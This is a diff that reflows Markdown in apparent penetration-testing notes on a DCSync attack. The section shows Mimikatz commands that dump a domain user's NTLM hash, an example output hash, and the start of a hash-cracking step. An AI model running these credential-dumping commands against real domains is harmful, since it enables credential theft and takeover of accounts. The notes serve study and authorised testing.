@@ -91,28 +91,28 @@ ls domain_hashes*
 ### 4. Executing the DCSync Attack with Mimikatz
 **Run Mimikatz**
     
-    ```bash
-    .\mimikatz.exe
-    ```
-    
-    - **Command**: Dump the NTLM hash of a target user:
+ ```bash
+.\mimikatz.exe
+```
+
+**Command**: Dump the NTLM hash of a target user:
         
-        ```bash
-        lsadump::dcsync /user:<domain>\<username>
-        ```
+```bash
+lsadump::dcsync /user:<domain>\<username>
+ ```
         
-    - **Example**:
+**Example**:
         
-        ```bash
-        lsadump::dcsync /user:corp\dave
-        ```
+```bash
+lsadump::dcsync /user:corp\dave
+ ```
         
-    - **Result (Extract)**:
+**Result (Extract)**:
         
-        ```
-        Credentials:
-            Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
-        ```
+```
+Credentials:
+Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
+```
         
 3. **Crack the NTLM Hash**
     
